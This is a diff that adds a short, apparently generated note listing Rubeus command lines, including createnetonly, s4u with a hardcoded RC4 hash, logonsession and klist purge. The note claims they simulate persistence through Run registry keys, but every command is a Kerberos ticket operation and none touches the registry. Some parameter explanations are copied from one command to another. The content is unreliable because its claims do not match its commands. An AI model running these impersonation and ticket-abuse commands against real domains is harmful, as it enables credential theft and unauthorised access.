@@ -1,0 +1,19 @@
+Here are the command lines that simulate using Run registry keys to maintain persistence:
+
+Command: `rubeus.exe createnetonly /program:"C:\Windows\System32\rundll32.exe" /impersonateuser:<placeholder>`
+
+This command creates a hidden process with random network-only credentials, displaying the PID and LUID. The `/impersonateuser` parameter is necessary to specify the user under which the process will run.
+
+Command: `rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:<placeholder>`
+
+This command executes the S4U2self process, returning a forwardable ticket. The `/impersonateuser` parameter is necessary to specify the user under which the process will run.
+
+Command: `rubeus.exe logonsession`
+
+This command displays information about the current context's logon session if not elevated, or all logonsessions if elevated. This is useful for checking the persistence of the attack.
+
+Command: `rubeus.exe klist /purge`
+
+This command purges all Kerberos tickets from the current logon session, or (if elevated) to the logon session specified by `/luid:<placeholder>`.
+
+Note: The `<placeholder>` in the above commands indicates that you should replace this with a specific value depending on your needs.
